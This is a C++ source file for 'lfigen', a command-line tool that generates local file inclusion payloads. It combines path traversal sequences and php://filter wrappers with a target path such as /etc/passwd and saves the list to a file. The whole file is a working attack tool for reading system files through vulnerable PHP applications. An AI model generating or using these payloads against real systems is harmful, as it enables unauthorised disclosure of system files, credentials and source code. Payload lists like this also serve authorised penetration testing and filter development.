#include <iostream>
#include <fstream>
#include <string>
#include <vector>

using namespace std;

vector<string> generate(char* dir);
void save_to_file(vector<string>& the_payloads, char* file_name);

int main(int argc, char* argv[]){
    if (argc != 3){
        cout << "lfigen v1.0 a simple tool that generates LFI payloads based on your target file/directory.\n";
        cout << "Example: " << argv[0] << " {file/path} {output_filename}\n";
        cout << "2nd Example: " << argv[0] << "/etc/passwd payload.txt\n";
        return -1;
    }
    vector<string> the_payloads = generate(argv[1]);

    save_to_file(the_payloads, argv[2]);

    return 0;
}

vector<string> generate(char* dir){
    vector<string> new_payloads;
    string cdir(dir);
    int config;

    if (cdir.rfind("/", 0) == 0){
        config = 1;
    }
    else {
        config = 0;
    }

    const char* payloads1[] = {
        "/..",
        "/../.",
        "/../..",
        "/../.",
        "/../../..",
        "/../../.",
        "/..//..//..//..//..//..//..//..",
        "/..\\\\..\\",
        "/../../../../../../../../../../../../..",
        "/..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\",
        "/../../../../../../../..",
        "/........................................................................../../../../../../../..",
        "/..........................................................................\\..\\..\\..",
        "/../../../..", 
        "/../../../../..",
        };
    const char* payloads2[] = {
        "..",                                        
        "../.",                                      
        "../..",                                     
        "../.",                                      
        "../../..",                                   
        "../../.",                                   
        "..//..//..//..//..//..//..//..",              
        "..\\\\..\\",                                
        "../../../../../../../../../../../../..",   
        "..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\",   
        "../../../../../../../..",                  
        "........................................................................../../../../../../../..",  
        "..........................................................................\\..\\..\\..",               
        "../../../..",                               
        "../../../../..",                               
        };

    const char* filter_payloads[] = {"php://filter/string.toupper/string.rot13/string.tolower/resource=",
                                    "php://filter/convert.base64-encode/resource=",
                                    };
    
    if (config == 1){
        /* concatenates the first basic payloads with the target file*/
        for (auto payload1 : payloads1){
            string full_payload = string(payload1) + cdir;
            new_payloads.push_back(full_payload);
            /* concatenates the second basic payloads with the target file*/
            for (auto payload2 : payloads2){
                string full_payload2 = string(payload2) + cdir;
                new_payloads.push_back(full_payload2);
                /* concatenates the basic payloads with php://filter */
                for (auto payload3 : filter_payloads){
                    string full_payload3 = string(payload3) + full_payload;
                    string full_payload4 = string(payload3) + full_payload2;

                    new_payloads.push_back(full_payload3);
                    new_payloads.push_back(full_payload4);
                }
            }
        }
    }
    else {
        string full_file = "/" + cdir;

        /* concatenates the first basic payloads with the target file*/
        for (auto payload1 : payloads1){
            string full_payload = string(payload1) + full_file;
            new_payloads.push_back(full_payload);
            /* concatenates the second basic payloads with the target file*/
            for (auto payload2 : payloads2){
                string full_payload2 = string(payload2) + full_file;
                new_payloads.push_back(full_payload2);
                /* concatenates the basic payloads with php://filter */
                for (auto payload3 : filter_payloads){
                    string full_payload3 = string(payload3) + full_payload;
                    string full_payload4 = string(payload3) + full_payload2;

                    new_payloads.push_back(full_payload3);
                    new_payloads.push_back(full_payload4);
                }
            }
        }
    }
    return new_payloads;
}

void save_to_file(vector<string>& the_payloads, char* file_name){
    unsigned int vecSize = the_payloads.size();
    
    ifstream The_Check;

    The_Check.open(file_name);

    if (!The_Check.fail()){
        The_Check.close();
        ofstream WipeFile(file_name);

        WipeFile << "";

        WipeFile.close();
    }

    ofstream PayloadFile(file_name, ios::app);

    for (unsigned int i = 0; i < vecSize; i++){
        PayloadFile << the_payloads[i] << "\n";
    }
    

    cout << "[+] Saved payloads to " << file_name;
    return;
}